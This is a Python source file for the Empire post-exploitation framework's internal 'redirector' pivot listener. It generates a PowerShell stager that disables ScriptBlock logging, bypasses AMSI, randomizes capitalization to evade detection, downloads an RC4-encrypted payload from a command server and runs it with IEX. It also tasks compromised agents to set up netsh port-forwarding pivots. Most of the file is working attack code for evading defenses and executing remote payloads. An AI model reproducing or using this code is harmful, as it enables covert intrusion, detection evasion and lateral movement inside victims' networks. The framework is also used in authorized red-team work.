import base64
import random
import copy

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'redirector',

            'Author': ['@xorrior'],

            'Description': ("Internal redirector listener. Active agent required. Listener options will be copied from another existing agent."),

            # categories - client_server, peer_to_peer, broadcast, third_party
            'Category' : ('peer_to_peer'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Agent' : {
                'Description'   :   'Agent name that will serve as the internal pivot',
                'Required'      :   True,
                'Value'         :   ""
            },
            'internalIP' : {
                'Description'   :   'Internal IP address of the agent. Yes, this could be pulled from the db but it becomes tedious when there is multiple addresses.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Port' : {
                'Description'   :   'Port for the agent to listen on.',
                'Required'      :   True,
                'Value'         :   80
            },
            'Listener' : {
                'Description'   :   'Name of the listener to clone',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {} # used to keep track of any threaded instances of this server

        # optional/specific for this module
        

        # set the default staging key to the controller db default
        #self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        print helpers.color("[!] default_response() not implemented for pivot listeners")
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/template generate_launcher(): no language specified!')
            return None
        
        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)
            customHeaders = profile.split('|')[2:]

            if language.startswith('po'):
                # PowerShell

                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                if safeChecks.lower() == 'true':
                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")

                    # ScriptBlock Logging bypass
                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.Utils'"
                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
                    stager += "['ScriptB'+'lockLogging']"
                    stager += helpers.randomize_capitalization("){$GPS")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
                    stager += helpers.randomize_capitalization("$GPS")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                    stager += "'signatures','N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")

                    # @mattifestation's AMSI bypass
                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += "};"
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'https' in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('"+ proxy.lower() +"');")
                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                        if proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            if len(username.split('\\')) > 1:
                                usr = username.split('\\')[1]
                                domain = username.split('\\')[0]
                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                            else:
                                usr = username.split('\\')[0]
                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                        #save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $wc.Proxy;"

                # TODO: reimplement stager retries?
                #check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions['BindIP']['Value']
                port = listenerOptions['Port']['Value']
                if ':' in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                        else:
                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                stager += "$ser='%s';$t='%s';" % (host, stage0)
                #Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        #If host header defined, assume domain fronting is in use and add a call to the base URL first
                        #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                        if headerKey.lower() == "host":
                            stager += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")

                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)

                # add the RC4 packet to a cookie

                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)


                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python
                return ''

            else:
                print helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")

        else:
            print helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        print helpers.color("[!] generate_stager() not implemented for listeners/template")
        return ''


    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        print helpers.color("[!] generate_agent() not implemented for listeners/template")
        return ''


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.
        
        This should be implemented for the module.
        """

        if language:
            if language.lower() == 'powershell':
                
                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])
                
                getTask = """
                    function script:Get-Task {


                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {

                        }
                    }
                """

                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"

            elif language.lower() == 'python':
                # send_message()
                pass
            else:
                print helpers.color("[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
        else:
            print helpers.color('[!] listeners/template generate_comms(): no language specified!')


    def start(self, name=''):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """
        tempOptions = copy.deepcopy(self.options)
        listenerName = self.options['Listener']['Value']
        # validate that the Listener does exist
        if self.mainMenu.listeners.is_listener_valid(listenerName):
            # check if a listener for the agent already exists
            
            if self.mainMenu.listeners.is_listener_valid(tempOptions['Agent']['Value']):
                print helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Agent']['Value']))
                return False

            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            sessionID = self.mainMenu.agents.get_agent_id_db(tempOptions['Agent']['Value'])
            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)

            if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:

                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
                    #logic for powershell agents
                    script = """
        function Invoke-Redirector {
            param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)

            if($ShowAll){
                $out = netsh interface portproxy show all
                if($out){
                    $out
                }
                else{
                    "[*] no redirectors currently configured"
                }
            }
            elseif($Reset){
                $out = netsh interface portproxy reset
                if($out){
                    $out
                }
                else{
                    "[+] successfully removed all redirectors"
                }
            }
            else{
                if((-not $ListenPort)){
                    "[!] netsh error: required option not specified"
                }
                else{
                    $ConnectAddress = ""
                    $ConnectPort = ""
                    
                    $parts = $ConnectHost -split(":")
                    if($parts.Length -eq 2){
                        # if the form is http[s]://HOST or HOST:PORT
                        if($parts[0].StartsWith("http")){
                            $ConnectAddress = $parts[1] -replace "//",""
                            if($parts[0] -eq "https"){
                                $ConnectPort = "443"
                            }
                            else{
                                $ConnectPort = "80"
                            }
                        }
                        else{
                            $ConnectAddress = $parts[0]
                            $ConnectPort = $parts[1]
                        }
                    }
                    elseif($parts.Length -eq 3){
                        # if the form is http[s]://HOST:PORT
                        $ConnectAddress = $parts[1] -replace "//",""
                        $ConnectPort = $parts[2]
                    }
                    if($ConnectPort -ne ""){
                    
                        $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                        }
                    }
                    else{
                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                    }
                }
            }
        }
        Invoke-Redirector"""

                    script += " -ConnectHost %s" % (listenerOptions['Host']['Value'])
                    script += " -ListenPort %s" % (tempOptions['Port']['Value'])

                    # clone the existing listener options
                    self.options = copy.deepcopy(listenerOptions)

                    for option, values in self.options.iteritems():

                        if option.lower() == 'name':
                            self.options[option] = sessionID

                        elif option.lower() == 'host':
                            if self.options[option]['Value'].startswith('https://'):
                                host = "https://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['Port']['Value'])
                                self.options[option]['Value'] = host
                            else:
                                host = "http://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['Port']['Value'])
                                self.options[option]['Value'] = host

                    
                    # check to see if there was a host value at all
                    if "Host" not in self.options.keys():
                        self.options['Host']['Value'] = host

                    self.mainMenu.agents.add_agent_task_db(tempOptions['Agent']['Value'], "TASK_SHELL", script)
                    msg = "Tasked agent to install Pivot listener "
                    self.mainMenu.agents.save_agent_log(tempOptions['Agent']['Value'], msg)


                    return True

                elif self.mainMenu.agents.get_language_db(self.options['Agent']['Value']).startswith('py'):

                    # not implemented
                    script = """
                    """

                    print helpers.color("[!] Python pivot listener not implemented")
                    return False

                else:
                    print helpers.color("[!] Unable to determine the language for the agent")

            else:
                print helpers.color("[!] Agent is not present in the cache")
                return False

        

        return True


    def shutdown(self, name=''):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """
        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))

            sessionID = self.mainMenu.agents.get_agent_id_db(name)
            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
            if self.mainMenu.agents.is_agent_present(name) and isElevated:

                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):

                    script = """
                function Invoke-Redirector {
                    param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)

                    if($ShowAll){
                        $out = netsh interface portproxy show all
                        if($out){
                            $out
                        }
                        else{
                            "[*] no redirectors currently configured"
                        }
                    }
                    elseif($Reset){
                        $out = netsh interface portproxy reset
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully removed all redirectors"
                        }
                    }
                    else{
                        if((-not $ListenPort)){
                            "[!] netsh error: required option not specified"
                        }
                        else{
                            $ConnectAddress = ""
                            $ConnectPort = ""
                            
                            $parts = $ConnectHost -split(":")
                            if($parts.Length -eq 2){
                                # if the form is http[s]://HOST or HOST:PORT
                                if($parts[0].StartsWith("http")){
                                    $ConnectAddress = $parts[1] -replace "//",""
                                    if($parts[0] -eq "https"){
                                        $ConnectPort = "443"
                                    }
                                    else{
                                        $ConnectPort = "80"
                                    }
                                }
                                else{
                                    $ConnectAddress = $parts[0]
                                    $ConnectPort = $parts[1]
                                }
                            }
                            elseif($parts.Length -eq 3){
                                # if the form is http[s]://HOST:PORT
                                $ConnectAddress = $parts[1] -replace "//",""
                                $ConnectPort = $parts[2]
                            }
                            if($ConnectPort -ne ""){
                            
                                $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                                if($out){
                                    $out
                                }
                                else{
                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                                }
                            }
                            else{
                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                            }
                        }
                    }
                }
                Invoke-Redirector"""

                    script += " -Reset"

                    self.mainMenu.agents.add_agent_task_db(sessionID, "TASK_SHELL", script)
                    msg = "Tasked agent to uninstall Pivot listener "
                    self.mainMenu.agents.save_agent_log(sessionID, msg)

                    

                elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):
                    
                    print helpers.color("[!] Shutdown not implemented for python")
                    
            else:
                print helpers.color("[!] Agent is not present in the cache or not elevated")
                





        # if name and name != '':
        #     print helpers.color("[!] Killing listener '%s'" % (name))
        #     self.threads[name].kill()
        # else:
        #     print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
        #     self.threads[self.options['Name']['Value']].kill()

        pass
